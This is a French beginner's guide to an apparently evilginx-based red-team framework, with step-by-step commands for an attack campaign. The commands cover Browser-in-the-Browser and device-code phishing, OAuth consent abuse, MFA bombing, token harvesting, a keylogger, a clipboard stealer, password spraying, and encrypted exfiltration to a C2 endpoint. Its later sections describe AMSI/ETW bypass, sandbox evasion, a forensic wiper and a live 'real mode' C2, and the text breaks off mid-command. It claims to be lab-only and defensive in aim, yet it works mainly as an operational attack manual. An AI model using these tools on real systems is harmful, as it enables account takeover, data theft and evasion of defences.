# 🟥 VANTABLACK GODMODE — GUIDE COMPLET RED TEAM (Pas-à-pas débutant)

> **Cadre légal** : ce guide s'adresse à un opérateur travaillant dans un
> **labo isolé autorisé** (réseau dédié, cibles possédées, engagement signé).
> Chaque commande exécutée sur un système sans autorisation écrite est un
> délit. Le labo `*.lab.local` et les modes `mock` sont vos terrains de jeu.

> **Objectif de ce guide** : partir de zéro (repo cloné) et aboutir à une
> campagne Red Team complète exécutée + artefacts collectés, prêts à être
> attaqués par la défense (Phase 2 Blue Team).

---

## 📚 Table des matières

1. [Vue d'ensemble : comment ça marche](#1-vue-densemble--comment-ça-marche)
2. [Installation (une seule fois)](#2-installation-une-seule-fois)
3. [Vérifier que tout est sain](#3-vérifier-que-tout-est-sain)
4. [Comprendre l'arborescence](#4-comprendre-larborescence)
5. [LA campagne godmode (le gros morceau)](#5-la-campagne-godmode-le-gros-morceau)
6. [Les vecteurs un par un](#6-les-vecteurs-un-par-un)
7. [Le proxy AiTM + API REST](#7-le-proxy-aitm--api-rest)
8. [Cred stuffing / password spray](#8-cred-stuffing--password-spray)
9. [Post-exploitation & exfiltration](#9-post-exploitation--exfiltration)
10. [Infrastructure & anti-forensics](#10-infrastructure--anti-forensics)
11. [Tests & qualité](#11-tests--qualité)
12. [Où sont les artefacts ?](#12-où-sont-les-artefacts-)
13. [Dépannage (troubleshooting)](#13-dépannage-troubleshooting)
14. [Checklist opérateur avant un engagement](#14-checklist-opérateur-avant-un-engagement)
15. [MODE RÉEL : tests et opérations 100% réel (pas de simulation)](#15-mode-réel--tests-et-opérations-100-réel-pas-de-simulation)

---

## 1. Vue d'ensemble : comment ça marche

Vantablack est organisé en couches :

```
┌──────────────────────────────────────────────────────────┐
│  attack/godmode_orchestrator.py  ← LE CHEF D'ORCHESTRE   │
│  (enchaîne les 11-12 phases MITRE en 1 commande)          │
└──────────────┬───────────────────────────────────────────┘
               │ pilote
┌──────────────▼───────────────────────────────────────────┐
│  attack/  ← 17 modules offensifs (1 dossier = 1 vecteur)  │
│  bitb/ oauth_consent/ device_code/ mfa_bombing/ ...      │
└──────────────┬───────────────────────────────────────────┘
               │ utilise
┌──────────────▼───────────────────────────────────────────┐
│  core/ + engine/  ← proxy AiTM, capture session, MFA,     │
│  OPSEC, config, event bus (files de tâches)              │
└──────────────┬───────────────────────────────────────────┘
               │ écrit
┌──────────────▼───────────────────────────────────────────┐
│  captures/  ← TOUS les artefacts (preuves d'attaque)      │
│  campaigns/, quishing/, bitb.db, post_exploitation/ ...   │
└──────────────────────────────────────────────────────────┘
```

**Le principe d'un test** : chaque vecteur a un mode `mock` (labo, aucune
requête réseau réelle) et un mode réel (déverrouillé par ta config cible).
On commence TOUJOURS par `mock`.

---

## 2. Installation (une seule fois)

### 2.1 Prérequis

- Python **3.11+** (testé sur 3.14)
- `git`
- Optionnel : Go 1.20+ (pour le C2 `gohorse`), Redis (workers Celery)

### 2.2 Installation

```bash
# Cloner
git clone https://github.com/thesenegalesehitch/Vantablack-evilginx-core-.git
cd Vantablack-evilginx-core-

# Une seule commande fait tout : venv + dépendances
make install
```

Sortie attendue (fin) :

```
✅ Installation terminée. Utilisez :
     source .venv/bin/activate
  ou invoquez via : .venv/bin/python <script>
```

> 💡 **Deux façons de lancer Python** :
> - Activer le venv : `source .venv/bin/activate` puis `python ...`
> - Ou toujours préfixer : `.venv/bin/python ...` (utilisé dans ce guide,
>   marche sans activation)

---

## 3. Vérifier que tout est sain

**AVANT tout test**, lance le diagnostic :

```bash
make diagnose
```

Sortie attendue (le résumé doit être **31/31**) :

```
  RÉSUMÉ PAR SECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  environnement             6/6
  core_imports             11/11
  attack_imports            9/9
  blue_imports              3/3
  qualite                   1/1
  tests                     1/1
```

Puis la suite de tests complète :

```bash
# Tests unitaires (22)
.venv/bin/python -m pytest tests/ -q

# Contrat godmode (55 tests) + modules d'attaque (11)
.venv/bin/python -m pytest test_redteam_godmode.py test_attacks_all.py -q
```

Sorties attendues : `22 passed`, `66 passed`. Tout autre résultat =
stop, va au [§13 Dépannage](#13-dépannage-troubleshooting).

---

## 4. Comprendre l'arborescence

```text
attack/                    → LES 17 VECTEURS (Red Team)
├── godmode_orchestrator.py  orchestrateur 12 phases ⭐
├── bitb/                    Browser-in-the-Browser
├── oauth_consent/           Illicit Consent Grant
├── device_code/             Device Code Phishing
├── mfa_bombing/             MFA fatigue
├── credential_stuffing/     Password spray / stuffing
├── token_harvester/         Vol de tokens locaux
├── mailbox_pivot/           Règles mailbox (BEC)
├── post_exploitation/       Keylogger, clipboard, exfil
├── persistence/             Task XML, WMI, COM, IFEO
├── lateral_movement/        PtH, Kerberoast, WMI, PsExec
├── anti_forensics/          Wiper 3 passes
├── anti_analysis/           Détection VM/sandbox
├── obfuscation/             Polymorphisme AES
├── edr_bypass/              AMSI/ETW patch
├── domain_fronting/         CDN fronting
└── ws_smuggling/            Tunnel WS C2

core/                      → MOTEUR (proxy, session, MFA, OPSEC)
engine/                    → Proxy avancé + SessionHijacker
blue_team/                 → DÉFENSE (Phase 2, ne pas toucher en Phase 1)
phishlets/                 → Configs de cibles (O365, Google, ...)
captures/                  → ARTEFACTS (preuves d'attaque)
test_redteam_godmode.py    → CONTRAT exécutable (55 tests)
test_attacks_all.py        → Smoke test des 11 modules
```

> 🧠 **Règle d'or** : en Phase 1 tu ne touches **jamais** à `blue_team/`.
> La défense se construit APRÈS, calibrée contre les artefacts réels.

---

## 5. LA campagne godmode (le gros morceau)

C'est **LA commande qui teste tout**. Elle enchaîne les 11 phases MITRE :
env_check → preparation → initial_access (6 vecteurs simultanés) →
execution → persistence → defense_evasion → credential_access →
lateral_movement → collection → exfiltration → c2.

### 5.1 Ta première campagne (5 minutes)

```bash
.venv/bin/python -m attack.godmode_orchestrator --dry-run --no-cleanup
```

Sortie attendue (extraits) :

```
=== CAMPAGNE RED TEAM VTB-XXXXXXXX ===
Société    : LAB-Enterprise
Domaine AD : lab.local
Durée      : 3.0s
Score      : 100.0% de couverture offensive

  ✓ env_check        Score=0% (risque safe) — CPU=8, RAM=16384MB
  ✓ preparation      AMSI=hardware_breakpoint, ETW=thread_tracing_mask
  ✓ initial_access   BitB(MS)+OAuth(HelpDesk)+DeviceCode+MFABombing+SW+Quishing
  ✓ execution        Headless flow=OK, cookies capturés=2, JWT présent=oui
  ✓ persistence      Vecteurs=4 : wmi_event_sub, scheduled_task_xml, ...
  ✓ credential_access  Tokens harvestés=20, Kerberoast(etype RC4) ...
  ✓ exfiltration     Canal HTTPS chunked : 20 fichiers (155 Mo)
  ✓ command_and_control  C2 Go 'gohorse' (AES-GCM 256)
  ...
Phases réussies : 11/11
Artefacts       : 2
Rapport         : captures/campaigns/VTB-XXXXXXXX/campaign_report.json
```

**Que vient-il de se passer ?**
- Un ID de campagne `VTB-XXXXXXXX` a été créé
- Les 6 vecteurs d'accès initial ont tiré en parallèle
- Un rapport JSON complet a été écrit dans `captures/campaigns/`
- `--no-cleanup` a **préservé les artefacts** (sinon le wiper les efface)

### 5.2 Personnaliser la campagne

```bash
.venv/bin/python -m attack.godmode_orchestrator \
    --dry-run \
    --company "MA-BOITE" \
    --domain maboite.local \
    --profile it_admin \
    --aggressiveness 0.9 \
    --stealth 0.8 \
    --no-cleanup
```

| Option | Rôle | Valeurs |
|---|---|---|
| `--dry-run` | Simulation labo (défaut, toujours l'utiliser d'abord) | flag |
| `--company` | Nom de la cible labo | string |
| `--domain` | Domaine AD cible | string |
| `--profile` | Profil de victime simulée | `finance_user`, `it_admin`, `hr`, `dev`, `sales` |
| `--aggressiveness` | Agressivité globale | 0.0 → 1.0 |
| `--stealth` | Priorité furtivité | 0.0 → 1.0 |
| `--no-cleanup` | ⭐ Garde les artefacts (sinon wiper) | flag |
| `--output` | Dossier des artefacts | défaut `captures/campaigns` |

### 5.3 Le test "OPSEC sandbox" (comprendre l'abort automatique)

L'orchestrateur **abandonne tout** si l'environnement sent la sandbox
(quand `--stealth` est haut) :

```bash
.venv/bin/python -m pytest test_redteam_godmode.py::TestGodModeOrchestrator -v
```

Le test `test_orchestrator_high_stealth_sandbox_abort` simule une VM
d'analyse (score 0.92, Cuckoo détecté) et vérifie que la campagne
s'arrête avec un score de 0. C'est un **comportement de sécurité** : un
vrai attaquant ne balance jamais son arsenal dans une sandbox.

### 5.4 Lire le rapport de campagne

```bash
# Le rapport JSON complet
cat captures/campaigns/VTB-XXXXXXXX/campaign_report.json | python3 -m json.tool

# Le résumé lisible
cat captures/campaigns/VTB-XXXXXXXX/SUMMARY.txt
```

---

## 6. Les vecteurs un par un

Chaque vecteur peut se tester **indépendamment**. C'est comme ça qu'on
identifie *où* la défense doit détecter.

### 6.1 BitB — Browser-in-the-Browser 🔴

Fausse popup de login dans la page (contourne FIDO2, l'URL reste légitime).

```bash
# Générer la popup Microsoft
.venv/bin/python -m attack.bitb.cli --target microsoft --output /tmp/bitb_ms.html

# Autres cibles : google, okta, github, apple, facebook, linkedin
.venv/bin/python -m attack.bitb.cli --target google --output /tmp/bitb_go.html
```

Sortie attendue :
```
✅ BitB popup générée: /tmp/bitb_ms.html (5348 octets)
   Cible: microsoft
```

**Ouvrir `/tmp/bitb_ms.html` dans un navigateur** : tu vois la fausse
popup. Les identifiants saisis partent vers l'endpoint de capture
(`/tmp/bitb/capture` en mock).

**Où défendre (Phase 2)** : heuristiques DOM — popup sans bordure,
`overflow:hidden`, fake URL bar hors viewport → `blue_team/bitb_detector.py`.

### 6.2 OAuth Illicit Consent Grant 🔴

L'utilisateur accorde une app malveillante → refresh token 90 jours,
**sans jamais taper son mot de passe**.

```bash
# URL de consentement (mock = provider simulé)
.venv/bin/python attack/oauth_consent/cli.py generate \
    --provider mock \
    --scope "Mail.Read Files.ReadWrite.All offline_access" \
    --output /tmp/oauth_url.txt

cat /tmp/oauth_url.txt
```

Sortie attendue :
```
✅ URL de consentement générée (provider=mock)
   Fichier: /tmp/oauth_url.txt
```

> 🔑 **Passage au réel** (labo autorisé uniquement) :
> `--provider microsoft` construit l'URL
> `login.microsoftonline.com/common/oauth2/v2.0/authorize?...`.
> Il faut une app enregistrée côté tenant de labo + redirect_uri possédée.

**Où défendre** : alertes sur consentements `Mail.Read` à des apps
multi-tenant non vérifiées → `blue_team/oauth_monitor.py`.

### 6.3 Device Code Phishing 🔴

La victime entre LE CODE de l'attaquant sur `microsoft.com/devicelogin`.
Aucun mot de passe, FIDO2 inutile.

```bash
.venv/bin/python attack/device_code/cli.py launch \
    --provider mock --output /tmp/device_code_flow.json

# Lire le code généré
.venv/bin/python -c "import json; d=json.load(open('/tmp/device_code_flow.json')); \
    print('user_code:', d['user_code']); \
    print('verification_uri:', d['verification_uri']); \
    print('expires_at:', d['expires_at'])"
```

Sortie attendue :
```
✅ Device Code Flow initié (provider=mock)
   Output: /tmp/device_code_flow.json
   user_code       : S6CF-26VQ
   verification_uri: http://localhost:9000/device
   expires_at      : 2026-09-29T16:33:03Z
```

### 6.4 MFA Bombing (fatigue) 🟠

Spam de push MFA jusqu'à acceptation par erreur. Timing Poisson (λ=3)
pour imiter un humain.

```bash
# Simulation du plan de timing (dry-run = n'envoie rien)
.venv/bin/python attack/mfa_bombing/cli.py \
    --target alice@lab.local \
    --interval poisson --max 20 --dry-run \
    --output /tmp/mfa_timing.json
```

Sortie attendue (le test KS vérifie que le timing colle à Poisson) :
```
   KS-test (N=1000) : D=0.26  p=0.006
   Durée totale : 0h00m15s
   Output       : /tmp/mfa_timing.json
```

**Où défendre** : >3 pushes/h + géoloc incohérente → number matching.

### 6.5 Quishing (QR phishing) 🟠

```bash
.venv/bin/python quishing.py --url "https://ton-proxy-lab.local/sso" --out /tmp/q.png
```

Le QR est généré dans `/tmp/q.png` + copie dans `captures/quishing/`.
Scanne-le avec ton téléphone : il ouvre l'URL du proxy AiTM.

### 6.6 Token Harvester 🟠

```bash
# Collecte simulée sur toutes les sources
.venv/bin/python attack/token_harvester/cli.py scan \
    --mode mock --output /tmp/tokens.json

# Une source précise
.venv/bin/python attack/token_harvester/cli.py scan \
    --mode mock --source chrome --output /tmp/tokens_chrome.json
```

Sources couvertes : `chrome, edge, brave, discord, slack, outlook, teams,
aws_cli, azure_cli, gcp_cli, firefox`.

### 6.7 Domain Fronting (CDN) 🟡

```bash
# Lister les configs CDN prêtes
.venv/bin/python attack/domain_fronting/cli.py list-cdn

# Générer une config CloudFront (SNI != Host)
.venv/bin/python attack/domain_fronting/cli.py deploy \
    --cdn cloudfront --backend http://127.0.0.1:8080 \
    --output /tmp/fronting.json
```

### 6.8 WS Smuggling (tunnel C2) 🟡

```bash
# Créer la config de tunnel
.venv/bin/python attack/ws_smuggling/cli.py create-tunnel \
    --ws-url wss://cdn.lab-cloud.io/ws --subprotocol graphql-ws

# Tester le heartbeat
.venv/bin/python attack/ws_smuggling/cli.py test-heartbeat
```

---

## 7. Le proxy AiTM + API REST

Le proxy AiTM est le **cœur réseau** : la victime visite ton domaine, le
proxy relaie vers le vrai site et capture cookies/tokens/MFA en transit.

### 7.1 Lancer l'API + proxy

```bash
# Terminal 1 — l'API FastAPI (port 8000)
.venv/bin/python api/rest_api.py
```

Sortie attendue :
```
INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
INFO:     ADV_PROXY: [BITB] Routes registered: POST /_/bitb/capture, GET /_/bitb/popup
```

### 7.2 Tester les endpoints (Terminal 2)

```bash
# Lister les sessions capturées
curl -s http://localhost:8000/_/sessions | python3 -m json.tool

# Tester l'interception MFA (injecte un contenu avec un code)
curl -s -X POST "http://localhost:8000/_/mfa/intercept?content=Votre%20code%20est%20123456" \
  | python3 -m json.tool
# → {"intercepted_codes": ["123456"]}

# Popup BitB servie par le proxy
curl -s http://localhost:8000/_/bitb/popup | head -5
```

### 7.3 Le test E2E automatique

```bash
.venv/bin/python test_e2e.py
```

Sortie attendue :
```
[+]   POST /_/mfa/intercept -> 200 body={"intercepted_codes":["123456"]}
======================================================================
 TEST E2E RÉUSSI ✅
======================================================================
```

### 7.4 Choisir un phishlet (cible)

```bash
export PHISHLET_PATH=$PWD/phishlets/office365_advanced.yaml
.venv/bin/python api/rest_api.py
```

Phishlets dispo : `o365`, `office365_advanced`, `gmail_advanced`,
`google`, `facebook_advanced`, `twitter`, `linkedin`, `paypal`, ...

> ⚠️ Le proxy **n'accepte que les domaines whitelistés** du phishlet
> (protection anti-abus intégrée). Toute requête hors whitelist est rejetée.

---

## 8. Cred stuffing / password spray

Module `attack/credential_stuffing/` — simulation déterministe en labo
(hachage SHA-256 user:password → résultats reproductibles, zéro requête
réelle).

### 8.1 Password spray (1 mot de passe → N users)

```bash
.venv/bin/python - << 'EOF'
from attack.credential_stuffing.sprayer import (
    CredentialStuffingEngine, generate_password_spray_list,
)

# Génère la liste de mdp contextualisée (entreprise + saison + année)
pwds = generate_password_spray_list(company_name="ACME", current_year=2026)
print("Top 5 mdp spray:", pwds[:5])

eng = CredentialStuffingEngine(target_service="M365 — ACME lab")
users = [f"user{i}@acme.local" for i in range(60)]
report = eng.run_password_spray(users=users, passwords=pwds[:4], simulated=True)

print("Tentatives :", report.total_attempts)        # 240
print("Succès     :", report.successful_logins)
print("Lockouts   :", report.locked_accounts)
print("Hit rate   :", f"{report.hit_rate:.1%}")
print("Durée estimée réelle (avec throttling):", f"{report.duration_estimate_s:.0f}s")
EOF
```

Sortie attendue :
```
Top 3 mdp spray: ['ACME2026!', 'Acme2026!', 'ACME@2026']
Tentatives : 240
Succès     : 4
Lockouts   : 2
Hit rate   : 1.7%
Durée estimée réelle (avec throttling): 83s
```

### 8.2 Credential stuffing (couples leakés → 1 service)

```bash
.venv/bin/python - << 'EOF'
from attack.credential_stuffing.sprayer import CredentialPair, CredentialStuffingEngine

# Couples "issus d'un leak" (simulé)
pairs = [CredentialPair(user=f"user{i}@corp.local", password="Password1!")
         for i in range(200)]

eng = CredentialStuffingEngine(target_service="VPN — corp lab")
r1 = eng.run_credential_stuffing(pairs=pairs, simulated=True)
r2 = eng.run_credential_stuffing(pairs=pairs, simulated=True)

print("Déterministe :", r1.successful_logins == r2.successful_logins)  # True
print("Hits :", r1.hits[:2])
EOF
```

> 🔑 **Mode réel** : retire `simulated=True` et le SmartThrottler applique
> les délais anti-lockout (2,5 s → 20 s adaptatifs + jitter ±25 %).
> `VANTABLACK_TEST_MODE=1` (posé par conftest) désactive les sleeps pour
> les tests pytest uniquement.

---

## 9. Post-exploitation & exfiltration

### 9.1 Keylogger + patterns sensibles

```bash
.venv/bin/python - << 'EOF'
from attack.post_exploitation import CloudKeylogger

kl = CloudKeylogger(upload_endpoint="wss://c2.lab.invalid/keys", chunk_interval_s=60)
for ch in "Mon login est admin@corp.local avec mot de passe SuperSecret2026!":
    kl.inject_keypress(ch)

chunk = kl._build_chunk()
print("chunk_index :", chunk.chunk_index)
print("frappes     :", chunk.keystrokes[:50], "...")

# Détection automatique des secrets dans les frappes
patterns = kl.detect_patterns_in_chunk(chunk)
for p in patterns:
    print(f"  [{p['type']}] {p['value']}")
EOF
```

Sortie attendue :
```
chunk_index : 0
frappes     : Mon login est admin@corp.local avec mot de passe ...
  [email] admin@corp.local
  [password] SuperSecret2026!
```

### 9.2 Clipboard stealer (CB / IBAN / mots de passe)

```bash
.venv/bin/python - << 'EOF'
from attack.post_exploitation import ClipboardStealer

cs = ClipboardStealer()
samples = {
    "CB : 4111 1111 1111 1111, exp 12/27": "credit_card",
    "IBAN FR76 3000 4028 3700 0100 0000 096": "iban",
    "Login : admin@corp.net, Mot de passe : P@ssw0rd!2026": "password",
}
for content, expected in samples.items():
    snap = cs.inject_snapshot(content)
    types = [p["type"] for p in snap.detected_patterns]
    print(f"attendu={expected} → détecté={types}")
EOF
```

### 9.3 Data staging sur VRAI filesystem (scoring de sensibilité)

```bash
.venv/bin/python - << 'EOF'
import tempfile
from pathlib import Path
from attack.post_exploitation import DataStager

# Créer un mini-répertoire "victime"
tmp = tempfile.mkdtemp()
(Path(tmp) / "MOTS_DE_PASSES.txt").write_text("root:hunter2")
(Path(tmp) / "Budget_2026_Q1.xlsx").write_text("SALAIRES DIRIGEANTS")
(Path(tmp) / "rapport_rh.doc").write_text("PLAN DE LICENCIEMENT")
(Path(tmp) / "photo_vacances.jpg").write_bytes(b"\xff\xd8fake")

stager = DataStager(root_dir=tmp)
stager.scan()
for f in stager.staged:  # trié par sensibilité décroissante
    print(f"{f.sensitivity_score:.2f}  {f.file_name}")
EOF
```

Sortie attendue :
```
0.85  MOTS_DE_PASSES.txt
0.60  rapport_rh.doc
0.50  Budget_2026_Q1.xlsx
0.15  photo_vacances.jpg
```

### 9.4 Exfiltration chiffrée (AES-256-GCM réel)

```bash
.venv/bin/python - << 'EOF'
import tempfile
from pathlib import Path
from attack.post_exploitation import DataExfiltrator, StagedFile

tmp = Path(tempfile.mkdtemp())
secret = tmp / "secret.xlsx"
secret.write_bytes(b"THIS IS A SECRET DOCUMENT WITH PASSWORD hunter2")

out = tmp / "out.bin.enc"
ex = DataExfiltrator(destination="https://c2.lab.invalid/exfil", output_path=out)
sf = StagedFile(path=secret, size_bytes=secret.stat().st_size,
                file_type="xlsx", sensitivity_score=0.9)
r = ex.exfil_files(files=[sf])

print("fichier chiffré :", r["output_path"])
print("chiffrement     :", r["cipher_suite"])
print("clé session b64 :", r["session_key_b64"][:20], "...")

# PREUVE : le secret n'est PAS en clair sur disque
assert "hunter2" not in out.read_text(errors="ignore")
print("✅ Aucun secret en clair sur disque")
EOF
```

**Où défendre** : DLP sur sorties chiffrées, monitoring UDP/TLS volume.

---

## 10. Infrastructure & anti-forensics

### 10.1 Vérification OPSEC (avant un engagement)

```bash
.venv/bin/python - << 'EOF'
from core.opsec import OPSECVerifier

v = OPSECVerifier()
# Audit d'une config d'engagement
r = v.verify(
    user_agent="Mozilla/5.0 (Macintosh) Chrome/120 Safari/537",  # clean
    egress_ip="8.8.8.8",                                          # clean
    headers={"X-Forwarded-For": "10.0.0.5"},                      # ⚠️ fuite !
)
print("Score OPSEC :", r["score"], "/", 100)
print("Verdict     :", r["verdict"])
for f in r["findings"]:
    print("  ⚠️ ", f)

# UA considéré bruyant
print(v.check_user_agent("curl/8.0"))  # {'safe': False, 'reasons': [...]}
EOF
```

### 10.2 Test CSPRNG (les tokens sont-ils prévisibles ?)

```bash
.venv/bin/python core/csprng_test.py --output captures/csprng_report.json
```

Teste les générateurs (Frequency, Runs, Autocorrelation — NIST SP 800-22).
Un échec = side-channel exploitable → alimente la Phase 2.

### 10.3 Prédiction ML du prochain vecteur

```bash
.venv/bin/python analysis/behavioral/cli.py predict --target o365 --top 5 \
    --output /tmp/ml_pred.json
```

Sortie attendue (Markov O1/O2/O3 + Bayes + Poisson) :
```
  #1 QUISHING        P=0.363  CI=0.905  model=markov_o1
  #2 AIATM_PROXY     P=0.330  CI=0.919  model=markov_o1
  #3 WS_SMUGGLING    P=0.306  CI=0.927  model=markov_o1
```

### 10.4 Wiper anti-forensics (DANGER)

```bash
# ⚠️ EFFACE les artefacts de captures/ (3 passes DoD). À ne lancer que
# quand tu as récupéré TES preuves. En Phase 1, garde --no-cleanup.
.venv/bin/python - << 'EOF'
from attack.anti_forensics.wiper import AntiForensicsWiper, WipeTarget

w = AntiForensicsWiper()
op = w.plan_wipe([WipeTarget.PROXY_LOGS, WipeTarget.BASH_HISTORY])
print("Fichiers ciblés :", op.total_files_to_wipe)
print("Technique       :", op.technique)
# op = plan SEUL. L'exécution réelle est séparée (voir code).
EOF
```

### 10.5 Anti-analysis (détection VM/sandbox)

```bash
.venv/bin/python - << 'EOF'
from attack.anti_analysis import AntiAnalysisDetector

det = AntiAnalysisDetector()
r = det.run_full_check()
print(f"Score sandbox : {r.score:.2f} (0=clean, 1=sandbox)")
print(f"Risk level    : {r.risk_level}")
print(f"CPU/RAM       : {r.cpu_count} cores / {r.ram_mb} MB")
print(f"Triggers      : {r.triggers}")
EOF
```

---

## 11. Tests & qualité

```bash
# Lint (doit être CLEAN)
.venv/bin/ruff check .

# Toute la suite en une commande
.venv/bin/python -m pytest tests/ test_redteam_godmode.py test_attacks_all.py -q

# Un bloc précis (ex: latéral)
.venv/bin/python -m pytest test_redteam_godmode.py::TestLateralMovement -v

# Couverture de code
.venv/bin/python -m pytest tests/ test_redteam_godmode.py \
    --cov=attack --cov=core --cov-report=term-missing
```

### Map des tests (ce que chacun valide)

| Classe de test | Module validé | Nb |
|---|---|---|
| `TestAntiAnalysis` | detector VM/sandbox | 5 |
| `TestObfuscation` | AES, junk, CFG, polymorphe | 5 |
| `TestEDRBypass` | AMSI/ETW/syscalls | 6 |
| `TestLateralMovement` | PtH, Kerberoast, WMI, SOCKS | 8 |
| `TestPersistence` | Task XML, WMI bundle, COM, IFEO | 7 |
| `TestPostExploitation` | keylog, clipboard, staging, exfil | 5 |
| `TestCredentialStuffing` | proxy pool, throttler, spray | 6 |
| `TestGodModeOrchestrator` | campagne E2E + abort sandbox | 3 |
| `TestExistingModulesRegression` | BitB, OAuth, DC, MFA, wiper | 10 |

---

## 12. Où sont les artefacts ?

| Artefact | Chemin |
|---|---|
| Rapports de campagne | `captures/campaigns/VTB-*/campaign_report.json` |
| Résumés lisibles | `captures/campaigns/VTB-*/SUMMARY.txt` |
| QR codes quishing | `captures/quishing/*.png` |
| Popup BitB (HTML) | `/tmp` ou dossier passé en `--output` |
| Sessions capturées | mémoire proxy + `captures/bitb.db` (Fernet) |
| Keylog chunks | `captures/post_exploitation/keylog/*.jsonl` |
| Clipboard | `captures/post_exploitation/clipboard/all_snapshots.jsonl` |
| Fichiers staged | `captures/post_exploitation/staged/staged_index.jsonl` |
| Fichiers exfiltrés chiffrés | `captures/post_exploitation/exfil/session_*.bin.enc` |
| Cred attacks | `captures/credential_attacks/*.jsonl` |
| Wipe logs | `captures/wipe_log/` |
| Rapport CSPRNG | `captures/csprng_report.json` |
| Rapport diagnostic | `captures/diagnose_report.json` |

> 🧊 **Ces fichiers = tes preuves d'attaque.** La Phase 2 Blue Team va les
> consommer pour calibrer chaque détecteur. Ne les wipe PAS avant.

---

## 13. Dépannage (troubleshooting)

### `ModuleNotFoundError: No module named 'core'`
Tu lances depuis un autre dossier. **Toujours depuis la racine du repo** :
```bash
cd Vantablack-evilginx-core-
.venv/bin/python -m attack.godmode_orchestrator --dry-run
```

### `ImportError: cannot import name 'X' from 'Y'`
Rerun `make diagnose` → la section qui échoue te dit le module cassé.
Puis : `.venv/bin/python -m pytest test_attacks_all.py -q` pour identifier
le vecteur.

### La campagne reste bloquée / lent
C'est le throttling réaliste. Deux causes :
1. `VANTABLACK_TEST_MODE` absent → sleeps réels (normal hors pytest)
2. Campagne sans `simulated` → délais SmartThrottler 2,5-20 s

Pour du debug rapide :
```bash
VANTABLACK_TEST_MODE=1 .venv/bin/python -m attack.godmode_orchestrator --dry-run
```

### `pytest: error: unrecognized arguments: --timeout`
Le plugin pytest-timeout n'est pas installé. Ne l'utilise pas, ou :
```bash
.venv/bin/pip install pytest-timeout
```

### Redis / Celery absent
**Normal et géré** : le bus d'événements bascule en mode mémoire
(`[event_bus] Celery indisponible → bus en mode dégradé`). Les workers
Celery ne sont nécessaires que pour la persistance cross-process.

### Port 8000 déjà pris
```bash
lsof -i :8000          # trouver le process
kill -9 <PID>          # ou change le port dans api/rest_api.py
```

### Un test échoue après tes modifs
```bash
# Cibler le bloc
.venv/bin/python -m pytest test_redteam_godmode.py::TestObfuscation -v --tb=short

# Voir uniquement les lignes d'erreur
.venv/bin/python -m pytest test_redteam_godmode.py -q --tb=line | grep "^/Users"
```

### Ruff dit "All checks passed!" mais pytest échoue
Ruff = lint statique. Pytest = comportement. Les deux sont requis :
```bash
.venv/bin/ruff check . && .venv/bin/python -m pytest test_redteam_godmode.py -q
```

---

## 14. Checklist opérateur avant un engagement

- [ ] Autorisation **écrite** (scope, cibles, créneaux, contacts)
- [ ] Labo isolé OU cibles contractualisées, réseau dédié
- [ ] `make diagnose` → **31/31**
- [ ] `.venv/bin/python -m pytest test_redteam_godmode.py test_attacks_all.py -q` → **66 passed**
- [ ] `.venv/bin/ruff check .` → **All checks passed!**
- [ ] `core/csprng_test.py` → tokens imprévisibles (sinon side-channel)
- [ ] `OPSECVerifier.verify()` sur ta config UA/IP/headers → **PASS**
- [ ] `AntiAnalysisDetector.run_full_check()` → score < 0.5 (pas une sandbox)
- [ ] Dossier `captures/` chiffré au repos (FileVault/LUKS)
- [ ] `--no-cleanup` **activé** tant que la Phase 2 n'a pas consommé les preuves
- [ ] Plan de sortie : qui wipe quoi, quand, avec quel accord

---

## 🔄 Après la Phase 1 : transition Blue Team

Quand tu es satisfait de l'attaque (artefacts en main) :

1. **Inventorie les artefacts** par vecteur (`captures/`)
2. **Calibre chaque détecteur** `blue_team/*.py` contre son artefact réel
3. **Écris le test Red vs Blue** : "attaque passe → défense bloque"
4. **Heatmap MITRE** : `make mitre-heatmap` (couverture défensive)
5. **Itère** : attaque évolue → défense évolue → jusqu'à ce que le Blue gagne

> L'objectif final, comme dit dans la spec : *"à la fin, c'est le Blue
> Team qui gagne."* La Phase 1 t'en a donné les munitions ; la Phase 2
> construira le bouclier.

---

## 15. MODE RÉEL : tests et opérations 100% réel (pas de simulation)

> Chaque module godmode a **deux modes** : `simulated` (défaut, reproductible,
> utilisé par les suites de tests) et **`real`** (aucun mock : vraies requêtes
> HTTP/WS, vrai filesystem, vraie crypto, résultats réels uniquement).
> Tout ce qui suit a été **validé en live**, avec les sorties réelles.

### 15.1 La suite de tests du réel (une commande)

```bash
.venv/bin/python -m pytest test_real_mode.py -v
```

#### 🎬 Démo live devant public (recommandée pour une présentation)

```bash
make demo-real
```

Une seule commande, exit code honnête : pré-checks d'environnement en ouverture
(python, dépendances, répertoires), puis 7 étapes 100% réelles avec verdict par
ligne — C2 réel, stuffing (4 POST, verdicts HTTP individuels), exfil chiffré
avec SHA-256 croisé émetteur/récepteur, MFA bombing avec stop-on-accept,
tunnel WS, post-ex locale (known_hosts + /etc/hosts + presse-papier si dispo),
volontaires du public (identités de labo, consentement).
Stabilité vérifiée : 3 exécutions consécutives → 7/7 à chaque fois.
Preuves : `captures/demo_live/` + compteurs C2 consultés PAR HTTP.

**PORTABLE / RÉSEAU** — la démo ne dépend d'aucun appareil et fonctionne
à travers le wifi/LAN : les preuves « côté serveur » sont obtenues par HTTP
(compteurs + sessions du C2), donc valides même quand le C2 tourne sur une
AUTRE machine. Scénario deux machines (validé en live via une IP wifi réelle) :

```bash
# Machine A — le C2, visible sur le réseau :
LABC2_BIND=0.0.0.0 LABC2_ACCEPT_USERS="alice@corp.local,bob@corp.local" \
LABC2_LOCK_USERS="locked@corp.local" LABC2_ACCEPT_AFTER_N=3 \
.venv/bin/python c2/lab_c2_server.py 8099

# Machine B — l'attaquante, n'importe où sur le réseau autorisé :
make demo-real ARGS="--c2 http://IP-DE-LA-MACHINE-A:8099"
```

La machine B n'a besoin que du repo + `.venv` (httpx, websockets,
cryptography) : rien d'autre n'est requis, aucun chemin de la machine A.
Si le C2 est injoignable, la démo échoue en < 10s avec le diagnostic
(pare-feu, `LABC2_BIND=0.0.0.0` oublié) au lieu de rester suspendue.

Elle démarre elle-même ses serveurs réels (C2 de labo, reverse proxy AiTM,
echo WebSocket) et valide 6 chemins 100% réels. Résultat attendu :
`6 passed` (~12s, internet requis pour Device Code et le relay AiTM).

### 15.2 Le C2 de laboratoire (aucune dépendance)

```bash
# Terminal 1 — C2 réel (stdlib pur) sur :8099
LABC2_ACCEPT_USERS="alice@corp.local,bob@corp.local" \
LABC2_LOCK_USERS="locked@corp.local" \
